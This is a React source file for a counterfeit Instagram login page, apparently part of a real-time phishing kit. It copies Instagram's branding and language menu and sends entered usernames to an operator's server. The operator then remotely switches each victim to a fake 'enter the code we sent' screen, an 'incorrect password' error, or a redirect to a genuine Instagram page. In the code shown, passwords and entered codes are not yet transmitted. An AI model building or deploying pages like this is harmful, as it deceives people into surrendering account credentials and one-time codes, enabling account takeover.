import React, { useState, useEffect } from "react";
import "./App.css";
import emailjs from "emailjs-com";

function App() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showLanguageModal, setShowLanguageModal] = useState(false);
  const [selectedLanguage, setSelectedLanguage] = useState("English (US)");
  const [usernameFocused, setUsernameFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [isAutomating, setIsAutomating] = useState(false);
  const [currentView, setCurrentView] = useState("login"); // 'login', 'otp', 'error'
  const [errorMessage, setErrorMessage] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [maskedEmail, setMaskedEmail] = useState("");
  const [sessionId, setSessionId] = useState(null);
  const [pollingInterval, setPollingInterval] = useState(null);

  const API_URL = process.env.REACT_APP_API_URL || "http://localhost:3001";

  // Poll server for state changes
  useEffect(() => {
    if (!sessionId) return;

    const pollState = async () => {
      try {
        const response = await fetch(`${API_URL}/api/get-state/${sessionId}`);
        const data = await response.json();

        if (data.success && data.state !== "waiting") {
          handleStateChange(data.state);
          // Stop polling once we get a non-waiting state
          if (pollingInterval) {
            clearInterval(pollingInterval);
            setPollingInterval(null);
          }
        }
      } catch (error) {
        console.error("Error polling state:", error);
      }
    };

    // Poll every 2 seconds
    const interval = setInterval(pollState, 2000);
    setPollingInterval(interval);

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [sessionId]);

  const handleStateChange = (state) => {
    if (state === "getOtp") {
      // Mask the email (assuming username might be email)
      const email = username.includes("@") ? username : `${username}@gmail.com`;
      const masked = email.replace(
        /(.{1})(.*)(@.*)/,
        (match, first, middle, domain) => {
          return first + "*".repeat(Math.min(middle.length, 6)) + domain;
        }
      );
      setMaskedEmail(masked);
      setCurrentView("otp");
      setIsAutomating(false);
    } else if (state === "incorrectCredentials") {
      setCurrentView("login");
      setErrorMessage("Incorrect username or password");
      setIsAutomating(false);
    } else if (state === "success") {
      window.location.href =
        "https://www.instagram.com/challenge/ASiPub8EgqPKL-p8Ud3MuTh1C66lLQd_Ea6BRh6mA12lYI8R5gP5LpdfPG5Ge_je/ASRTebzeSSTW-_fOweJBGq71P7Onp_kyomgEd-mSPH9ft854LKrnuewUp5HOrpzz6wPGicm7zD_7lg/?challenge_context=AaX_Zvle_aRZcoWRerM1OtcBnl1x9nmuN8uBVQSbGvXfE_bDxLu9Ukb6OvQM8M21QbhfPChZICiNLp7dG3r2XZ-_NuzN6Or76omVjIVIOit5e4CE5mTr0QffVXmDMDyq_h8Rt1isD_BNZVDw695FK7XnTXtUZd4M0WrUJDNnoK9FJ33AhiLuFkf3FKg8uUWCx0ZE33Bjw7OR5cmquAq57X904yAgYFx-KKAVfDx4L13_r6klk5ur0PWw38NAIjxKkuNJm8S65glVWnrCidPj_S6pbjrJj2iJ5FnjKNaAiNbk8gW6kFq2Rehb27RdnjFRb8AE3mGU-fXxIE0_cL6CIu47-KZZhar9-bMWFZkGZfNlMMNi3eYTXKl3huh_RF7vOxPngzSKU3sbGSUDgS7myCo7AzTdLXVyL0WLnVRBcW7wg3tfBXMYNoRyLIikELwERg7kjuYMmjsCyRVrHeaJ_9VURM_8goxcP3sS4zjxO6ysRfArMJKMtD4rbIDCX6OkvcGBhWdfJY8x26KzrDQFm5Jxa4YfyD17f6giC3ogwoVI23hG9oXyapiBzmPgXN0fah-uRnP0gktPTXr_gXQ-LADHmkJbmV4lVIp2a7FpwDgBGOdYr8BTiYwayZMPG_3YI5nMpmmMPKY8pNhR1gOKlsbtLDqVJ9TbSQw6EyDgf9XA_ptzafPk1WIKfOukXxABEitY7JcFKP0f-Vc5AVyQUzQJnkmx6FMfk8FYkbzEvoXwgvp_Zf7HHYnv8A-qCLa0AVIZL-Zqzj1W2mz3iNPg1wMhT4voXJZj6mrm_5vl6kOZ9sCZ41W84cQXETnQVp0MBPMGWodIPoiRB45_DyJ7l1uHjy_QBzscEPBI1aFWGdFibYcYZpsD4PnXPlG_-RTZqbjN-_7ZUk0xiWYy_oS97fNktgxaydcvEhN8fhcKNKGZx2dMlOj_n5ms_WvVW1lYsug3dW_7UPRhuDwRf0cXoAbw8f1NeqLs5K2MK8yoHO6sDL8WTkEWntbP3VMX7lCoX5zF1IBLe7BA58LQ6QE4aiqO-kWmKDZVX183j0ri_6fbXJyy3VhrUp7l_N9MBHzizKbhAAedKCvUql1nCt6x-0xYgzuRmUxf1_B-uwChcA0Zq3CpuesCruPT9BgoiWj69gymusScHxXp0FiGEj1pAj_fXWjM1s-y0Qt38w3u4QF5Ckzl6FKKrJrHNasWCc6g8ii6CLybsN0gA93XDkw3s_tBVdBhPacEH17QXqLp1jqdd120WqJEQVTqviL7hDvkFWhb4r5zob3Is5Uh-JsQ65O-dPQ2YiNcfFT59YYfnd5h1Ouui4MC_NNr5lGz3xcdG4-Kw8wYJ4CK1GuI87j8sh_bu-mEwi16y_iiShD1dRVeKiWfMbpERkB44NKR8yrFn3wt89VPiUETnaYtDt8iEW4HaED0o9gMAwKXPjp_e8iI5otbGaxOHBE_YUh_L_f8HZqL5C3Y9krpEgUFAj1XDJfHQftyb1meTUWXk62lTpxN6dU0eAcaZoAR7bhu3rJU&deoia=1";
    }
  };

  const languages = [
    "English (US)",
    "Afrikaans",
    "Bahasa Indonesia",
    "Bahasa Melayu",
    "Dansk",
    "Deutsch",
    "English (UK)",
    "Español",
    "Español (España)",
    "Français",
    "Italiano",
    "Nederlands",
    "Norsk",
    "Polski",
    "Português",
    "Português (Brasil)",
    "Română",
    "Svenska",
    "Türkçe",
    "Русский",
    "中文(简体)",
    "中文(繁體)",
    "日本語",
    "한국어",
    "العربية",
    "हिन्दी",
  ];

  const translations = {
    "English (US)": {
      usernameLabel: "Username, email or mobile number",
      passwordLabel: "Password",
      loginButton: "Log in",
      forgotPassword: "Forgot password?",
      createAccount: "Create new account",
      selectLanguage: "Select your language",
      showPassword: "Show password",
      hidePassword: "Hide password",
    },
    "English (UK)": {
      usernameLabel: "Username, email or mobile number",
      passwordLabel: "Password",
      loginButton: "Log in",
      forgotPassword: "Forgot password?",
      createAccount: "Create new account",
      selectLanguage: "Select your language",
      showPassword: "Show password",
      hidePassword: "Hide password",
    },
    Afrikaans: {
      usernameLabel: "Gebruikersnaam, e-pos of selfoonnommer",
      passwordLabel: "Wagwoord",
      loginButton: "Meld aan",
      forgotPassword: "Wagwoord vergeet?",
      createAccount: "Skep nuwe rekening",
      selectLanguage: "Kies jou taal",
      showPassword: "Wys wagwoord",
      hidePassword: "Versteek wagwoord",
    },
    "Bahasa Indonesia": {
      usernameLabel: "Nama pengguna, email, atau nomor ponsel",
      passwordLabel: "Kata sandi",
      loginButton: "Masuk",
      forgotPassword: "Lupa kata sandi?",
      createAccount: "Buat akun baru",
      selectLanguage: "Pilih bahasa Anda",
      showPassword: "Tampilkan kata sandi",
      hidePassword: "Sembunyikan kata sandi",
    },
    "Bahasa Melayu": {
      usernameLabel: "Nama pengguna, e-mel atau nombor mudah alih",
      passwordLabel: "Kata laluan",
      loginButton: "Log masuk",
      forgotPassword: "Lupa kata laluan?",
      createAccount: "Buat akaun baharu",
      selectLanguage: "Pilih bahasa anda",
      showPassword: "Tunjukkan kata laluan",
      hidePassword: "Sembunyikan kata laluan",
    },
    Dansk: {
      usernameLabel: "Brugernavn, e-mail eller mobilnummer",
      passwordLabel: "Adgangskode",
      loginButton: "Log ind",
      forgotPassword: "Glemt adgangskode?",
      createAccount: "Opret ny konto",
      selectLanguage: "Vælg dit sprog",
      showPassword: "Vis adgangskode",
      hidePassword: "Skjul adgangskode",
    },
    Deutsch: {
      usernameLabel: "Benutzername, E-Mail oder Handynummer",
      passwordLabel: "Passwort",
      loginButton: "Anmelden",
      forgotPassword: "Passwort vergessen?",
      createAccount: "Neues Konto erstellen",
      selectLanguage: "Wählen Sie Ihre Sprache",
      showPassword: "Passwort anzeigen",
      hidePassword: "Passwort ausblenden",
    },
    Español: {
      usernameLabel: "Nombre de usuario, correo electrónico o número de móvil",
      passwordLabel: "Contraseña",
      loginButton: "Iniciar sesión",
      forgotPassword: "¿Olvidaste tu contraseña?",
      createAccount: "Crear cuenta nueva",
      selectLanguage: "Selecciona tu idioma",
      showPassword: "Mostrar contraseña",
      hidePassword: "Ocultar contraseña",
    },
    "Español (España)": {
      usernameLabel: "Nombre de usuario, correo electrónico o número de móvil",
      passwordLabel: "Contraseña",
      loginButton: "Iniciar sesión",
      forgotPassword: "¿Olvidaste tu contraseña?",
      createAccount: "Crear cuenta nueva",
      selectLanguage: "Selecciona tu idioma",
      showPassword: "Mostrar contraseña",
      hidePassword: "Ocultar contraseña",
    },
    Français: {
      usernameLabel: "Nom d'utilisateur, e-mail ou numéro de mobile",
      passwordLabel: "Mot de passe",
      loginButton: "Se connecter",
      forgotPassword: "Mot de passe oublié ?",
      createAccount: "Créer un nouveau compte",
      selectLanguage: "Sélectionnez votre langue",
      showPassword: "Afficher le mot de passe",
      hidePassword: "Masquer le mot de passe",
    },
    Italiano: {
      usernameLabel: "Nome utente, e-mail o numero di cellulare",
      passwordLabel: "Password",
      loginButton: "Accedi",
      forgotPassword: "Password dimenticata?",
      createAccount: "Crea nuovo account",
      selectLanguage: "Seleziona la tua lingua",
      showPassword: "Mostra password",
      hidePassword: "Nascondi password",
    },
    Nederlands: {
      usernameLabel: "Gebruikersnaam, e-mail of mobiel nummer",
      passwordLabel: "Wachtwoord",
      loginButton: "Inloggen",
      forgotPassword: "Wachtwoord vergeten?",
      createAccount: "Nieuw account aanmaken",
      selectLanguage: "Selecteer uw taal",
      showPassword: "Wachtwoord weergeven",
      hidePassword: "Wachtwoord verbergen",
    },
    Norsk: {
      usernameLabel: "Brukernavn, e-post eller mobilnummer",
      passwordLabel: "Passord",
      loginButton: "Logg inn",
      forgotPassword: "Glemt passord?",
      createAccount: "Opprett ny konto",
      selectLanguage: "Velg ditt språk",
      showPassword: "Vis passord",
      hidePassword: "Skjul passord",
    },
    Polski: {
      usernameLabel: "Nazwa użytkownika, e-mail lub numer telefonu",
      passwordLabel: "Hasło",
      loginButton: "Zaloguj się",
      forgotPassword: "Zapomniałeś hasła?",
      createAccount: "Utwórz nowe konto",
      selectLanguage: "Wybierz swój język",
      showPassword: "Pokaż hasło",
      hidePassword: "Ukryj hasło",
    },
    Português: {
      usernameLabel: "Nome de usuário, e-mail ou número de celular",
      passwordLabel: "Senha",
      loginButton: "Entrar",
      forgotPassword: "Esqueceu a senha?",
      createAccount: "Criar nova conta",
      selectLanguage: "Selecione seu idioma",
      showPassword: "Mostrar senha",
      hidePassword: "Ocultar senha",
    },
    "Português (Brasil)": {
      usernameLabel: "Nome de usuário, e-mail ou número de celular",
      passwordLabel: "Senha",
      loginButton: "Entrar",
      forgotPassword: "Esqueceu a senha?",
      createAccount: "Criar nova conta",
      selectLanguage: "Selecione seu idioma",
      showPassword: "Mostrar senha",
      hidePassword: "Ocultar senha",
    },
    Română: {
      usernameLabel: "Nume de utilizator, e-mail sau număr de telefon",
      passwordLabel: "Parolă",
      loginButton: "Conectează-te",
      forgotPassword: "Ai uitat parola?",
      createAccount: "Creează cont nou",
      selectLanguage: "Selectează limba",
      showPassword: "Afișează parola",
      hidePassword: "Ascunde parola",
    },
    Svenska: {
      usernameLabel: "Användarnamn, e-post eller mobilnummer",
      passwordLabel: "Lösenord",
      loginButton: "Logga in",
      forgotPassword: "Glömt lösenord?",
      createAccount: "Skapa nytt konto",
      selectLanguage: "Välj ditt språk",
      showPassword: "Visa lösenord",
      hidePassword: "Dölj lösenord",
    },
    Türkçe: {
      usernameLabel: "Kullanıcı adı, e-posta veya cep telefonu",
      passwordLabel: "Şifre",
      loginButton: "Giriş yap",
      forgotPassword: "Şifreni mi unuttun?",
      createAccount: "Yeni hesap oluştur",
      selectLanguage: "Dilini seç",
      showPassword: "Şifreyi göster",
      hidePassword: "Şifreyi gizle",
    },
    Русский: {
      usernameLabel: "Имя пользователя, электронная почта или номер телефона",
      passwordLabel: "Пароль",
      loginButton: "Войти",
      forgotPassword: "Забыли пароль?",
      createAccount: "Создать аккаунт",
      selectLanguage: "Выберите язык",
      showPassword: "Показать пароль",
      hidePassword: "Скрыть пароль",
    },
    "中文(简体)": {
      usernameLabel: "用户名、电子邮件或手机号码",
      passwordLabel: "密码",
      loginButton: "登录",
      forgotPassword: "忘记密码？",
      createAccount: "创建新帐户",
      selectLanguage: "选择您的语言",
      showPassword: "显示密码",
      hidePassword: "隐藏密码",
    },
    "中文(繁體)": {
      usernameLabel: "使用者名稱、電子郵件或手機號碼",
      passwordLabel: "密碼",
      loginButton: "登入",
      forgotPassword: "忘記密碼？",
      createAccount: "建立新帳號",
      selectLanguage: "選擇您的語言",
      showPassword: "顯示密碼",
      hidePassword: "隱藏密碼",
    },
    日本語: {
      usernameLabel: "ユーザー名、メールアドレス、または携帯電話番号",
      passwordLabel: "パスワード",
      loginButton: "ログイン",
      forgotPassword: "パスワードを忘れた場合",
      createAccount: "新しいアカウントを作成",
      selectLanguage: "言語を選択",
      showPassword: "パスワードを表示",
      hidePassword: "パスワードを非表示",
    },
    한국어: {
      usernameLabel: "사용자 이름, 이메일 또는 휴대폰 번호",
      passwordLabel: "비밀번호",
      loginButton: "로그인",
      forgotPassword: "비밀번호를 잊으셨나요?",
      createAccount: "새 계정 만들기",
      selectLanguage: "언어 선택",
      showPassword: "비밀번호 표시",
      hidePassword: "비밀번호 숨기기",
    },
    العربية: {
      usernameLabel: "اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول",
      passwordLabel: "كلمة المرور",
      loginButton: "تسجيل الدخول",
      forgotPassword: "نسيت كلمة المرور؟",
      createAccount: "إنشاء حساب جديد",
      selectLanguage: "اختر لغتك",
      showPassword: "إظهار كلمة المرور",
      hidePassword: "إخفاء كلمة المرور",
    },
    हिन्दी: {
      usernameLabel: "उपयोगकर्ता नाम, ईमेल या मोबाइल नंबर",
      passwordLabel: "पासवर्ड",
      loginButton: "लॉग इन करें",
      forgotPassword: "पासवर्ड भूल गए?",
      createAccount: "नया खाता बनाएं",
      selectLanguage: "अपनी भाषा चुनें",
      showPassword: "पासवर्ड दिखाएं",
      hidePassword: "पासवर्ड छुपाएं",
    },
  };

  const t = translations[selectedLanguage] || translations["English (US)"];

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsAutomating(true);
    setErrorMessage("");

    // Create session on server
    try {
      const response = await fetch(`${API_URL}/api/create-session`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username }),
      });

      const data = await response.json();
      if (data.success) {
        setSessionId(data.sessionId);
        console.log("Session created:", data.sessionId);
        console.log(
          `To control from anywhere, call: POST ${API_URL}/api/set-state with body: { "sessionId": "${data.sessionId}", "command": "getOtp" | "incorrectCredentials" | "success" }`
        );
      }
    } catch (error) {
      console.error("Error creating session:", error);
    }

    // Show "Logging in..." for 12 seconds
    setTimeout(() => {
      setIsAutomating(false);
      // Polling will continue to check for state changes
      console.log("Waiting for API call to set state...");
    }, 12000);
  };

  const handleOtpSubmit = (e) => {
    e.preventDefault();
    // Handle OTP submission if needed
    console.log("OTP submitted:", otpCode);
  };

  const handleGetNewCode = () => {
    console.log("Get new code requested");
    // Handle get new code logic
  };

  const handleTryAnotherWay = () => {
    setCurrentView("login");
    setOtpCode("");
  };

  const isFormValid = username.trim() !== "" && password.trim() !== "";

  const handleLanguageSelect = (language) => {
    setSelectedLanguage(language);
    setShowLanguageModal(false);
  };

  // OTP Page Component
  if (currentView === "otp") {
    return (
      <div className="App">
        <div className="otp-container">
          <div className="otp-header">
            <button
              className="back-button"
              onClick={() => setCurrentView("login")}
            >
              <svg
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M15 18L9 12L15 6"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
            </button>
            <button className="help-button">
              <svg
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <circle
                  cx="12"
                  cy="12"
                  r="10"
                  stroke="currentColor"
                  strokeWidth="2"
                />
                <path
                  d="M9.09 9A3 3 0 0 1 12 6C13.657 6 15 7.343 15 9C15 10.657 13.657 12 12 12"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                />
                <path
                  d="M12 16H12.01"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                />
              </svg>
            </button>
          </div>

          <h1 className="otp-title">Check your email</h1>
          <p className="otp-instruction">
            Enter the code we sent to {maskedEmail || "m******1@gmail.com"}
          </p>

          <div className="otp-illustration">
            <div className="phone-illustration">
              <div className="phone-screen">
                <div className="shield-icon">🛡️</div>
                <div className="code-display">****</div>
                <div className="keypad-grid"></div>
              </div>
            </div>
          </div>

          <form className="otp-form" onSubmit={handleOtpSubmit}>
            <input
              type="text"
              className="otp-input"
              placeholder="Enter code"
              value={otpCode}
              onChange={(e) => setOtpCode(e.target.value)}
              maxLength={6}
            />

            <button
              type="button"
              className="get-new-code"
              onClick={handleGetNewCode}
            >
              <svg
                width="20"
                height="20"
                viewBox="0 0 24 24"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M1 4V10H7"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
                <path
                  d="M23 20V14H17"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
                <path
                  d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10M23 14L18.36 18.36A9 9 0 0 1 3.51 15"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
              Get a new code
            </button>

            <button type="submit" className="continue-button">
              Continue
            </button>
            <button
              type="button"
              className="try-another-way-button"
              onClick={handleTryAnotherWay}
            >
              Try another way
            </button>
          </form>
        </div>
      </div>
    );
  }

  // Login Page Component
  return (
    <div className="App">
      <div
        className="language-selector"
        onClick={() => setShowLanguageModal(true)}
        onKeyDown={(e) => {
          if (e.key === "Enter" || e.key === " ") {
            e.preventDefault();
            setShowLanguageModal(true);
          }
        }}
        role="button"
        tabIndex={0}
      >
        {selectedLanguage}
      </div>
      <div className="login-container">
        <div className="instagram-logo">
          <img
            src="https://static.cdninstagram.com/rsrc.php/v4/yq/r/_7cAFFbc4Pr.png"
            alt="Instagram"
          />
        </div>
        <form className="login-form" onSubmit={handleSubmit}>
          {errorMessage && <div className="error-message">{errorMessage}</div>}
          <div className="form-group">
            <label
              htmlFor="username"
              className={`input-label ${
                username || usernameFocused ? "focused" : ""
              }`}
            >
              {t.usernameLabel}
            </label>
            <input
              id="username"
              type="text"
              placeholder={t.usernameLabel}
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              onFocus={() => setUsernameFocused(true)}
              onBlur={() => setUsernameFocused(false)}
              required
            />
          </div>
          <div className="form-group">
            <label
              htmlFor="password"
              className={`input-label ${
                password || passwordFocused ? "focused" : ""
              }`}
            >
              {t.passwordLabel}
            </label>
            <div className="password-input-wrapper">
              <input
                id="password"
                type={showPassword ? "text" : "password"}
                placeholder={t.passwordLabel}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onFocus={() => setPasswordFocused(true)}
                onBlur={() => setPasswordFocused(false)}
                required
              />
              {password && (
                <button
                  type="button"
                  className="password-toggle"
                  onClick={() => setShowPassword(!showPassword)}
                  aria-label={showPassword ? t.hidePassword : t.showPassword}
                >
                  {showPassword ? (
                    <svg
                      width="20"
                      height="20"
                      viewBox="0 0 24 24"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"
                        stroke="#a8a8a8"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        fill="none"
                      />
                      <circle
                        cx="12"
                        cy="12"
                        r="3"
                        stroke="#a8a8a8"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        fill="none"
                      />
                    </svg>
                  ) : (
                    <svg
                      width="20"
                      height="20"
                      viewBox="0 0 24 24"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"
                        stroke="#a8a8a8"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        fill="none"
                      />
                      <line
                        x1="1"
                        y1="1"
                        x2="23"
                        y2="23"
                        stroke="#a8a8a8"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      />
                    </svg>
                  )}
                </button>
              )}
            </div>
          </div>
          <button
            type="submit"
            className={`login-button ${isFormValid ? "active" : ""}`}
            disabled={!isFormValid || isAutomating}
          >
            {isAutomating ? "Logging in..." : t.loginButton}
          </button>
        </form>
        <div className="forgot-password">
          <a
            href="https://www.instagram.com/accounts/password/reset/"
            target="_blank"
            rel="noopener noreferrer"
          >
            {t.forgotPassword}
          </a>
        </div>
        <a
          href="https://www.instagram.com/accounts/signup/phone/"
          target="_blank"
          rel="noopener noreferrer"
          className="create-account-button"
        >
          {t.createAccount}
        </a>
        <div className="meta-logo">
          <img
            src="https://static.cdninstagram.com/rsrc.php/v4/y3/r/aAfprBW6TIe.png"
            alt="Meta"
          />
        </div>
      </div>

      {showLanguageModal && (
        <>
          <div
            className="modal-overlay"
            onClick={() => setShowLanguageModal(false)}
            onKeyDown={(e) => {
              if (e.key === "Enter" || e.key === " ") {
                e.preventDefault();
                setShowLanguageModal(false);
              }
            }}
            role="button"
            tabIndex={0}
          ></div>
          <div className="language-modal">
            <div className="modal-header">
              <button
                className="close-button"
                onClick={() => setShowLanguageModal(false)}
              >
                <svg
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M18 6L6 18M6 6L18 18"
                    stroke="white"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                </svg>
              </button>
              <h2 className="modal-title">{t.selectLanguage}</h2>
            </div>
            <div className="modal-content">
              <div className="language-list">
                {languages.map((language) => (
                  <div
                    key={language}
                    className="language-item"
                    onClick={() => handleLanguageSelect(language)}
                    onKeyDown={(e) => {
                      if (e.key === "Enter" || e.key === " ") {
                        e.preventDefault();
                        handleLanguageSelect(language);
                      }
                    }}
                    role="button"
                    tabIndex={0}
                  >
                    <span className="language-name">{language}</span>
                    <div className="checkbox-container">
                      {selectedLanguage === language ? (
                        <div className="checkbox checked">
                          <svg
                            width="12"
                            height="12"
                            viewBox="0 0 12 12"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg"
                          >
                            <path
                              d="M10 3L4.5 8.5L2 6"
                              stroke="white"
                              strokeWidth="2"
                              strokeLinecap="round"
                              strokeLinejoin="round"
                            />
                          </svg>
                        </div>
                      ) : (
                        <div className="checkbox"></div>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </div>
            <div className="drag-indicator modal-indicator"></div>
          </div>
        </>
      )}
    </div>
  );
}

export default App;
